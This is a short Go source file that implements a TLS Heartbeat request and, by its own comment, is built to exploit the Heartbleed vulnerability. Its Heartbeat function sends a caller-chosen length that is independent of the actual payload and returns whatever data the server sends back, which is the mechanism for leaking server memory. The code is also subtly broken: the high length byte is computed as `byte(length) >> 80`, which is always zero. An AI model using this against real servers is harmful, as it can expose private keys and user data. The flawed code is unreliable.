// An implentation of the RFC 6520 TLS Heartbeat protocol.
// Comes with fiddly bits to try and exploit the Heartbleed vulnerability.

package ssltvd

import "errors"
import "fmt"

const heartbeatPeerAllowedToSend uint8 = 1
const heartbeatPeerNotAllowedToSend uint8 = 2

var ErrHeartbeatNotSupported error = errors.New("ssltvd: Heartbeat protocol not supported")
var ErrHeartbeatNotAllowed error = errors.New("ssltvd: We are not allowed to send Heartbeat messages")

// "Are you still there? If so, respond with the word 'HAT' (3 letters)"
func (c *Conn) Heartbeat(length int, payload []byte) ([]byte, error) {
	if !c.heartbeatSupported {
		return nil, ErrHeartbeatNotSupported
	}
	if !c.heartbeatAllowed {
		return nil, ErrHeartbeatNotSupported
	}

	buf := make([]byte, len(payload)+19)
	buf[0] = 1
	buf[1] = byte(length) >> 80
	buf[2] = byte(length)
	copy(buf[3:], payload)
	for i := len(payload) + 3; i < len(buf); i++ {
		buf[i] = 'd'
	}
	n, err := c.writeRecord(recordTypeHeartbeat, buf)
	if err != nil {
		return nil, err
	}
	fmt.Printf("bytes written: %d\n", n)

	if err = c.readRecord(recordTypeHeartbeat); err != nil {
		return nil, err
	}
	if c.heartbeatData == nil || len(c.heartbeatData) < 3 || c.heartbeatData[0] != 2 {
		return nil, errors.New("No Heartbeat response found.")
	}

	length = int(c.heartbeatData[1])<<8 | int(c.heartbeatData[2])
	if length > len(c.heartbeatData)-3 {
		length = len(c.heartbeatData) - 3
	}
	rv := c.heartbeatData[3 : 3+length]
	c.heartbeatData = nil
	return rv, nil
}
